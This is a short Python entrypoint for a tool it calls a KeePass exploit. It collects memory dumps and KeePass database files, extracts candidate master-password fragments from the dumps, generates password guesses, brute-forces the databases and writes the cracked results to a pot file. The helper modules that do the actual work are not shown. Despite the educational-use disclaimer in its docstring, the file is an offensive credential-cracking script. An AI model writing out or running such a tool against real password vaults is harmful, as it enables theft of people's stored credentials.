"""
This script is intended solely for educational purposes as an exercise in imitation.
Any practical use of this script outside of educational or supervised demonstration scenarios is strictly prohibited.

Author: Mihai-Andrei Neacsu
"""

import traceback
from init import init
from logger import log_msg
from utils import (
    brute_force,
    collect_dumps,
    collect_possible_pwds,
    generate_pwds,
    get_or_create_folders,
    generate_pot_file,
)


def keepass_exploit_entrypoint():
    args = init()
    possible_pwds_dir, generated_pwds_dir, keepass_dump_masterkey_dir = get_or_create_folders()

    dump_files, keepass_files = collect_dumps(args.dir)
    possible_pwds_files = collect_possible_pwds(dump_files, keepass_dump_masterkey_dir, possible_pwds_dir)
    generated_pwds_files = generate_pwds(possible_pwds_files, generated_pwds_dir)
    results = brute_force(generated_pwds_files, keepass_files)
    generate_pot_file(results, args.dir)


if __name__ == "__main__":
    try:
        keepass_exploit_entrypoint()
    except Exception:
        log_msg(traceback.format_exc(), "ERROR")
